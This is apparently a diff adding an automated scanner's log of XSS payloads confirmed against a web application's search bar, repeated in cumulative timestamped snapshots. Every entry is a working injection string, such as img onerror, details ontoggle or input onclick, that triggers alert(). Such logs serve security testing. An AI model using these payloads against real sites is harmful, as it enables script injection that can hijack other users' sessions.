@@ -1,0 +1,53 @@
+# Working XSS Payloads - 2025-06-28 05:14:43.090625
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+# Working XSS Payloads - 2025-06-28 05:15:14.871921
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+# Working XSS Payloads - 2025-06-28 05:15:46.630850
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+# Working XSS Payloads - 2025-06-28 05:16:11.779470
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+# Working XSS Payloads - 2025-06-28 05:16:45.968666
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+# Working XSS Payloads - 2025-06-28 05:17:15.777843
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
+# Working XSS Payloads - 2025-06-28 05:17:46.457676
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
+# Working XSS Payloads - 2025-06-28 05:18:11.388144
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
+>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+# Working XSS Payloads - 2025-06-28 05:18:49.537726
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
+>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+# Working XSS Payloads - 2025-06-28 05:20:37.957541
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
+><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
+><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
+>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
